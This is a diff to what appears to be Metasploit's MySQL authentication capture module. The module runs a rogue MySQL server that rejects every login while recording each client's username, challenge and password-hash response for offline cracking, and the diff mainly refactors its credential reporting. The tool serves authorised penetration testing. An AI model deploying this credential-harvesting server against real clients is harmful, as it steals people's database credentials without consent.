@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
@@ -32,7 +29,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('SRVVERSION', [ true, "The server version to report in the greeting response", "5.5.16" ]),
         OptString.new('CAINPWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
         OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
-      ], self.class)
+      ])
   end
 
   def setup
@@ -48,7 +45,6 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
     @version = datastore['SRVVERSION']
-    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
     exploit()
   end
 
@@ -62,7 +58,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def mysql_send_greeting(c)
-    # http://forge.mysql.com/wiki/MySQL_Internals_ClientServer_Protocol#Handshake_Initialization_Packet
+    # https://dev.mysql.com/doc/internals/en/connection-phase-packets.html
 
     length = 68 + @version.length
     packetno = 0
@@ -128,6 +124,32 @@ class Metasploit3 < Msf::Auxiliary
     c.put data
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :nonreplayable_hash
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def on_client_data(c)
     info = { :errors => [] }
     data = c.get_once
@@ -139,21 +161,19 @@ class Metasploit3 < Msf::Auxiliary
     elsif info[:username] and info[:response]
       mysql_send_error(c, "Access denied for user '#{info[:username]}'@'#{c.peerhost}' (using password: YES)")
       if info[:database]
-        print_status("#{@state[c][:name]} - User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}; Database: #{info[:database]}")
+        print_good("#{@state[c][:name]} - User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}; Database: #{info[:database]}")
       else
-        print_status("#{@state[c][:name]} - User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}")
+        print_good("#{@state[c][:name]} - User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}")
       end
       hash_line = "#{info[:username]}:$mysql$#{@challenge.unpack("H*")[0]}$#{info[:response].unpack('H*')[0]}"
-      report_auth_info(
-        :host  => c.peerhost,
-        :port => datastore['SRVPORT'],
-        :sname => 'mysql_client',
-        :user => info[:username],
-        :pass => hash_line,
-        :type => "mysql_hash",
-        :proof => info[:database] ? info[:database] : hash_line,
-        :source_type => "captured",
-        :active => true
+
+      report_cred(
+        ip: c.peerhost,
+        port: datastore['SRVPORT'],
+        service_name: 'mysql_client',
+        user: info[:username],
+        password: hash_line,
+        proof: info[:database] ? info[:database] : hash_line
       )
 
       if (datastore['CAINPWFILE'])
